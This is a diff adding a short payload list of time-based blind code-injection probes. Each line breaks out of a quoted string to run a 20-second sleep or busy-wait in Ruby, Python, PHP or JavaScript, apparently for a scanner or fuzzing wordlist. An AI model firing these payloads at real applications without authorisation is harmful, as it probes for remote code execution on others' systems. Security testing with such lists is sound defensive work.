@@ -1,0 +1,6 @@
+'+sleep(20.to_i)+'
+'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
+'.sleep(20).'
+{${sleep(20)}}
+'+(function(){if(typeof fzuiz==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);fzuiz=1;}}())+'
